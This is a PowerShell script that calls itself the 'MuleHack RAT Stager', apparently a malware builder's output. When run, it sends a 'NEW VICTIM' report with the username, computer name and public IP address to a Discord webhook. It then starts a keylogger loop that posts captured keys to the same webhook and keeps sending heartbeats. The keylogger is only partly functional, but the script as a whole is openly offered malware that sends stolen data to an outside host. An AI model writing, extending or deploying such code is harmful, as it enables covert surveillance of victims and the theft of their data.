
# MuleHack RAT Stager
# Build ID: a14262b8
# Created: 2026-08-07T15:42:23.682341

$webhook = "https://discord.com/api/webhooks/your_webhook"
$build_id = "a14262b8"

function Send-Data {
    param($data)
    try {
        $body = @{content = $data} | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
    } catch {}
}

# Send initial hit
Send-Data "```diff`n+ NEW VICTIM`n+ Build: $build_id`n+ User: $env:USERNAME`n+ PC: $env:COMPUTERNAME`n+ IP: $(Invoke-RestMethod -Uri 'https://api.ipify.org')`n```"

# Keylogger (simplified)
function Start-Keylogger {
    $log = ""
    while ($true) {
        $keys = [System.Windows.Forms.Keys]
        foreach ($key in [Enum]::GetValues($keys)) {
            if ([System.Windows.Forms.Control]::ModifierKeys -eq $key) {
                $log += "[$key]"
            }
        }
        Start-Sleep -Milliseconds 100
        if ($log.Length -gt 0) {
            Send-Data "```KEYLOG: $log```"
            $log = ""
        }
    }
}

# Start keylogger in background
Start-Keylogger

# Keep running
while ($true) {
    Start-Sleep -Seconds 60
    # heartbeat
    Send-Data "```HEARTBEAT: $env:USERNAME@$env:COMPUTERNAME```"
}
